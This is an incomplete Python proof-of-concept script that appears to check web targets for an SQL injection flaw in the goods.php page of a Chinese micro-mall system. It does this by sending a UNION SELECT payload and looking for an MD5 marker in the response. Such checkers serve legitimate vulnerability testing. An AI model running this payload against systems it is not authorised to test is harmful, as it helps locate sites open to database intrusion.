...
def main():
    parser = argparse.ArgumentParser(description='微商城系统 goods.php SQL注入漏洞')
...
def check(target):
    ...
    first_target = target
    target = target+"/goods.php?id='+UNION+ALL+SELECT+NULL,NULL,NULL,CONCAT(IFNULL(CAST(MD5(1)+AS+NCHAR),0x20)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-"
    headers = {
    ...
    try:
        ...
        if response.status_code == 200 and "c4ca4238a0b923820dcc509a6f75849b" in response.text:
            print(f"[+]{first_target} is vulnerable!")
        else:
            print(f"[-]{first_target} is not vulnerable!")
    except requests.exceptions.Timeout:
        print(f"[-]{first_target} 超时")
    except requests.exceptions.RequestException as e:
        print(f"[-]{first_target} 出现请求异常: {e}")
